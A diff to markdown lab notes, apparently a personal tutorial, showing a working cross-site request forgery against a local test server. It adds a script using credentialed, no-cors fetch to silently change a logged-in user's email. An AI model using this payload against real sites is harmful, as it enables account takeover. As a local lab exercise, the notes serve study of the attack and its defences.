@@ -814,5 +814,36 @@ We are going to use
           - attack-server
             - Run targer-server: [attack-server](http://localhost:5555)
             - Credentials are send to target-server
+            - In attak-server browser's console cors error still happend. 
             - email is updated like **undefined**
               - This is because target-server does not expect a json it expect a form.
+
+      - Try 03: 
+
+        - Update apps/attack-server/src/index_01.html file
+
+          ```html
+            ....
+              <script>
+                fetch("http://localhost:3333/login/edit", {
+                  method: "POST",
+                  credentials: "include",
+                  mode: "no-cors",
+                  headers: {
+                    "Content-type": "application/x-www-form-urlencoded"
+                  },
+                  body: "email=HACKED_sinqueteenteres@test.com",
+                })
+                  ....
+              </script>
+          ```
+
+        - Try 03: How this attack occurs
+          - targer-server
+            - Run targer-server: [targer-server](http://localhost:3333/home)
+            - Login into targer-server
+          - attack-server
+            - Run targer-server: [attack-server](http://localhost:5555)
+            - Credentials are send to target-server
+            - cors error are not showed. 
+            - email is updated 
